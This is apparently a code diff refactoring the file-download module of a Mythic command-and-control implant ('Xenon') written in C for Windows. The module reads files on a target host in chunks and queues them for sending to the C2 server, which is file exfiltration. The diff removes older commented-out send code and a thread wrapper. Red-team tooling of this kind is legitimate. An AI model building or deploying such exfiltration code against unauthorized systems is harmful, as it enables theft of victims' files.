@@ -46,74 +46,48 @@ DWORD DownloadInit(_In_ PCHAR taskUuid, _Inout_ PFILE_DOWNLOAD File)
 
     PackageQueue(data);
 
-    // Send package
-    // PARSER Response = { 0 };
-    // PackageSend(data, &Response);
-    
-//     BYTE status = ParserGetByte(&Response);
-//     if (status == FALSE)
-//     {
-//         _err("DownloadInit returned failure status : 0x%hhx", status);
-//         Status = ERROR_MYTHIC_DOWNLOAD;
-//         goto end;
-//     }
-
-//     SIZE_T lenUuid  = TASK_UUID_SIZE;
-//     PCHAR uuid = ParserGetString(&Response, &lenUuid);
-//     if (uuid == NULL) 
-//     {
-//         _err("Failed to get UUID from response.");
-//         Status = ERROR_MYTHIC_DOWNLOAD;
-//         goto end;
-//     }
-
-//     _dbg("Download Inititialized for %s with UUID %s", download->filepath, uuid);
-
-//     strncpy(download->fileUuid, uuid, TASK_UUID_SIZE + 1);
-//     download->fileUuid[TASK_UUID_SIZE + 1] = '\0';    // null-termination
-
-// end:
-//     // Cleanup
-//     if (data) PackageDestroy(data);
-//     if (&Response) ParserDestroy(&Response);
-
     return Status;
 }
 
-/* Update Mythic File UUID for Download Task */
-BOOL DownloadUpdateFileUuid(PCHAR TaskUuid, PCHAR FileUuid)
+/**
+ * @brief Update Mythic File UUID for Download Task 
+ */
+BOOL DownloadSync(PCHAR TaskUuid, PCHAR FileUuid)
 {
-
     PFILE_DOWNLOAD List = xenonConfig->DownloadQueue;
 
-    if (!TaskUuid || !FileUuid) {
+    if ( !TaskUuid || !FileUuid ) {
         return FALSE;
     }
 
     /* Find Task This Belongs To */
-    while (List)
+    while ( List )
     {
-        if (strcmp(List->TaskUuid, TaskUuid) == 0)
+        if ( strcmp(List->TaskUuid, TaskUuid) == 0 )
         {
-            /* Update file UUID */
-            strncpy(List->fileUuid, FileUuid, sizeof(List->fileUuid));            
-            _dbg("Set Download File Mythic ID: %s", List->fileUuid);
+            /* Only update file UUID if not initialized yet */
+            if ( !List->Initialized )
+            {
+                /* Update file UUID */
+                strncpy(List->fileUuid, FileUuid, sizeof(List->fileUuid));            
+                _dbg("Set Download File Mythic ID: %s", List->fileUuid);
 
-            List->Initialized = TRUE;
-
+                List->Initialized = TRUE;
+            }
+            
             return TRUE;
         }
 
         List = List->Next;
     }
 
-    return FALSE;
+    return TRUE;
 }
 
 /**
  * @brief Add instance of FILE_DOWNLOAD to global tracker
  */
-VOID DownloadQueue(_In_ FILE_DOWNLOAD* File)
+VOID DownloadQueue(_In_ PFILE_DOWNLOAD File)
 {
     _dbg("Adding file to download queue...");
     
@@ -137,84 +111,11 @@ VOID DownloadQueue(_In_ FILE_DOWNLOAD* File)
         }
         List->Next  = File;
     }
-    
-    return TRUE;
 }
 
-/**
- * @brief Send b64 chunks of a file to Mythic server
- * 
- * @param[in] taskUuid Task's UUID
- * @param[inout] download FILE_DOWNLOAD struct which contains details of a file
- * @return BOOL
- */
-// DWORD DownloadContinue(_In_ PCHAR taskUuid, _Inout_ FILE_DOWNLOAD* download)
-// {
-//     DWORD Status = 0;
-//     char* chunkBuffer = (char*)LocalAlloc(LPTR, CHUNK_SIZE);
-
-//     if (!chunkBuffer)
-//     {
-//         DWORD error = GetLastError();
-//         _err("Memory allocation failed. ERROR CODE: %d", error);
-//         goto cleanup;
-//     }
-
-//     _dbg("Downloading Mythic File as UUID : %s", download->fileUuid);
-
-//     download->currentChunk = 1;
-
-//     while (download->currentChunk <= download->totalChunks)
-//     {
-//         DWORD bytesRead = 0;
-//         if (!ReadFile(download->hFile, chunkBuffer, CHUNK_SIZE, &bytesRead, NULL))
-//         {
-//             DWORD error = GetLastError();
-//             _err("Error reading file: ERROR CODE: %d", error);
-//             Status = error;
-//             goto cleanup;
-//         }
-
-//         _dbg("Sending chunk %d/%d (size: %d)", download->currentChunk, download->totalChunks, bytesRead);
-
-//         // Prepare package
-//         PPackage cur = PackageInit(DOWNLOAD_CONTINUE, TRUE);
-//         PackageAddString(cur, taskUuid, FALSE);
-//         PackageAddInt32(cur, download->currentChunk);
-//         PackageAddBytes(cur, download->fileUuid, TASK_UUID_SIZE, FALSE);
-//         PackageAddBytes(cur, chunkBuffer, bytesRead, TRUE);
-//         PackageAddInt32(cur, bytesRead);
-
-//         // Send chunk
-//         PARSER Response = { 0 };
-//         PackageSend(cur, &Response);
-
-//         BYTE success = ParserGetByte(&Response);
-//         if (success == FALSE)
-//         {
-//             _err("Download chunk %d failed.", download->currentChunk);
-//             Status = ERROR_MYTHIC_DOWNLOAD;
-//             PackageDestroy(cur);
-//             ParserDestroy(&Response);
-//             goto cleanup;
-//         }
-
-//         download->currentChunk++;
-
-//         PackageDestroy(cur);
-//         ParserDestroy(&Response);
-//     }
-
-// cleanup:
-//     if (chunkBuffer) LocalFree(chunkBuffer);
-
-//     return Status;
-// }
-
-
 
 /**
- * @brief Queue file chunks to sender
+ * @brief Queue file chunks to Sender Queue
  * 
  * @param[inout] File FILE_DOWNLOAD file instance
  * @return BOOL
@@ -240,7 +141,7 @@ BOOL DownloadQueueChunks(_Inout_ PFILE_DOWNLOAD File)
     while (File->currentChunk <= File->totalChunks)
     {
         DWORD bytesRead = 0;
-        if (!ReadFile(File->hFile, chunkBuffer, CHUNK_SIZE, &bytesRead, NULL))
+        if ( !ReadFile(File->hFile, chunkBuffer, CHUNK_SIZE, &bytesRead, NULL) )
         {
             DWORD error = GetLastError();
             _err("Error reading file: ERROR CODE: %d", error);
@@ -252,7 +153,7 @@ BOOL DownloadQueueChunks(_Inout_ PFILE_DOWNLOAD File)
             /* EOF Reached */
             goto CLEANUP;
         }
-            
+
 
         _dbg("Adding chunk %d/%d (size: %d)", File->currentChunk, File->totalChunks, bytesRead);
 
@@ -265,26 +166,12 @@ BOOL DownloadQueueChunks(_Inout_ PFILE_DOWNLOAD File)
         PackageAddBytes(Chunk, File->fileUuid, TASK_UUID_SIZE, FALSE);
         PackageAddBytes(Chunk, chunkBuffer, bytesRead, TRUE);
         PackageAddInt32(Chunk, bytesRead);
-        // Send chunk
-        // PARSER Response = { 0 };
-        // PackageSend(Chunk, &Response);
-        PackageQueue(Chunk);
 
-        // BYTE success = ParserGetByte(&Response);
-        // if (success == FALSE)
-        // {
-        //     _err("Download chunk %d failed.", Download->currentChunk);
-        //     Status = ERROR_MYTHIC_DOWNLOAD;
-        //     PackageDestroy(cur);
-        //     ParserDestroy(&Response);
-        //     goto CLEANUP;
-        // }
+        PackageQueue(Chunk);
 
         NumOfChunks++;
         File->currentChunk++;
 
-        // PackageDestroy(Chunk);
-        // ParserDestroy(&Response);
     }
 
 
@@ -298,6 +185,7 @@ CLEANUP:
     return Success;
 }
 
+
 /**
  * @brief Add any chunks for file downloads to packet
  */
@@ -306,7 +194,7 @@ VOID DownloadPush()
     PFILE_DOWNLOAD Current = xenonConfig->DownloadQueue;
     PFILE_DOWNLOAD Prev    = NULL;
 
-    while (Current)
+    while ( Current )
     {
 
         PFILE_DOWNLOAD Next = Current->Next;
@@ -362,8 +250,6 @@ VOID Download(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
     PFILE_DOWNLOAD File = NULL;
     PCHAR FilePath      = NULL;
 
-    // FILE_DOWNLOAD fd    = { 0 };
-
     File = (PFILE_DOWNLOAD)LocalAlloc(LPTR, sizeof(FILE_DOWNLOAD));         // Must Free
 
     if ( File == NULL )
@@ -393,51 +279,15 @@ VOID Download(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
         goto end;
     }
 
-    // _dbg("Downloading FilePath:\"%s\" - ID:%s", File->filepath, File->fileUuid);
-
 
     /* Add Download Instance to Queue */
     DownloadQueue(File);
 
-    // Transfer chunked file
-    // status = DownloadContinue(taskUuid, &fd);
-    // if ( status != 0 )
-    // {
-    //     PackageError(taskUuid, status);
-    //     goto end;
-    // }
-
-    // PackageComplete(taskUuid, NULL);
-
 end:
 
     return;
-    // Cleanup
-    // if (fd.hFile) CloseHandle(fd.hFile);
 }
 
-/**
- * @brief Thread entrypoint for Download function. 
- * 
- * @param[in] lpTaskParamter Structure that holds task related data (taskUuid, taskParser)
- * 
- * @return DWORD WINAPI
- */
-DWORD WINAPI DownloadThread(_In_ LPVOID lpTaskParamter)
-{
-    _dbg("Thread started.");
-
-    TASK_PARAMETER* tp = (TASK_PARAMETER*)lpTaskParamter;
-
-    Download(tp->TaskUuid, tp->TaskParser);
-    
-    _dbg("Download Thread cleaning up now...");
-    // Cleanup things used for thread
-    free(tp->TaskUuid);
-    ParserDestroy(tp->TaskParser);
-    LocalFree(tp);  
-    return 0;
-}
 
 /**
  * @brief Free the download
